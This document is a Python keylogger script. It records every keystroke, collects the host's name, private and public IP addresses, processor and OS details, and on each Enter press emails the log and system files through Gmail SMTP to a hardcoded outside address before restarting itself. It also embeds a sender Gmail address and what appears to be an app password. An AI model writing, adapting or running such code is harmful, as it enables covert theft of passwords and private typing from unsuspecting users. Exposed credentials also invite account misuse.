from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import pyperclip

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

import os
import sys

# Get the script directory
script_directory = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))

#FILE VARIABLES
keys_info = "key_log.txt"
file_path =script_directory
extend ="/"
system_info="system_info.txt"

#EMAIL VARIABLES
email_address="pythonklg@gmail.com"
password="rifs tfmg iseu mvkv"
toaddr="deepsahaj18@gmail.com"



#FUNCTION TO RESTART THE PROGRAM WHEN USER PRESSES ENTER KEY
def restart_program():
    python_executable = sys.executable
    script_path = os.path.abspath(os.path.join(script_directory, "projectkey.py"))

    # Pass the same arguments as the original script
    os.execv(python_executable, [python_executable, script_path] + sys.argv[1:])



#FUNCTION TO SEND THE EMAIL
def send_email(filename, attachment, toaddr):

    fromaddr=email_address
    msg= MIMEMultipart()
    msg["From"]=fromaddr
    msg["To"]=toaddr
    msg["Subject"]="Log File"

    body="Body_of_the_mail"

    msg.attach(MIMEText(body,'plain'))

    filename=filename
    attachment=open(attachment,'rb')

    p=MIMEBase('application','octet=stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition',"attachment; filename= %s" % filename)

    msg.attach(p)

    s=smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login(fromaddr,password)

    text = msg.as_string()
    s.sendmail(fromaddr,toaddr,text)

    s.quit()


def computer_info():
    
    system_info_path = os.path.join(file_path, system_info)

    with open(system_info_path, 'a') as f:
        hostname=socket.gethostname()
        IPAddr= socket.gethostbyname(hostname)

        try:
            public_ip=get("https://api.ipify.org").text
            f.write("Public IP Address: " +public_ip)

        except Exception:
            f.write("Error")

        f.write("Processor: "+ (platform.processor())+'\n')
        f.write("System: "+platform.system() + " " +platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: "+hostname +'\n')
        f.write("Private IP Address: "+IPAddr + '\n')


computer_info()


#KEYS LIST VARIABLES
count = 0
keys=[]

#FUNCTION TO IMPLEMENT ON KEY PRESS
def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1

    if count>=1:
        count=0
        write_file(keys)
        keys=[]

#FUNCTION TO WRITE THE FILE WITH THE KEYSTROKES
def write_file(keys):

    keys_file_path = os.path.join(file_path, keys_info)
    with open(keys_file_path, "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space")>0:
                f.write('\n')
                
            elif k.find("Key")==-1:
                f.write(k)
        
        f.close()
                
#FUNCTION TO IMPLEMENT 'STOP PROGRAM' AND 'RESTART PROGRAM'
def on_release(key):

    if key==Key.enter:
        send_email(keys_info, os.path.join(file_path, keys_info), toaddr)
        send_email(system_info, os.path.join(file_path, system_info), toaddr)
        print("Restarting the program...")
        restart_program()


    elif key == Key.esc:
        return False
    
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


 